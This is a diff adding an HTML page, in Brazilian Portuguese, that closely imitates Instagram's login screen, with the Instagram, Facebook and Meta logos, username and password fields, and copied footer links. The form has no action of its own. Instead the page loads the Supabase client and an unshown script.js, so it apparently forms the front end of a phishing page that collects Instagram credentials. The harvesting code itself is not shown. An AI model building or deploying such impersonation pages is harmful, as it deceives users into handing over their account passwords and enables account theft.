@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-wrapper">
+        <header class="top-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+        </header>
+
+        <main class="login-container">
+            <h1>Entrar no Instagram</h1>
+            
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Número de celular, nome de usuário ou email" required>
+                <input type="password" id="password" placeholder="Senha" required>
+                
+                <button type="submit" id="btn-submit" class="btn-primary" disabled>Entrar</button>
+                
+                <a href="#" class="forgot-password">Esqueceu a senha?</a>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or">OU</div>
+                    <div class="line"></div>
+                </div>
+
+                <button type="button" class="btn-outline">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" alt="" class="fb-icon">
+                    Entrar com o Facebook
+                </button>
+
+                <button type="button" class="btn-outline create-account">
+                    Criar nova conta
+                </button>
+            </form>
+
+            <div class="meta-footer-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
+            </div>
+        </main>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <a href="#">Meta</a><a href="#">Sobre</a><a href="#">Blog</a><a href="#">Carreiras</a><a href="#">Ajuda</a><a href="#">API</a><a href="#">Privacidade</a><a href="#">Termos</a><a href="#">Localizações</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Meta Verified</a>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="script.js"></script>
+</body>
+</html>
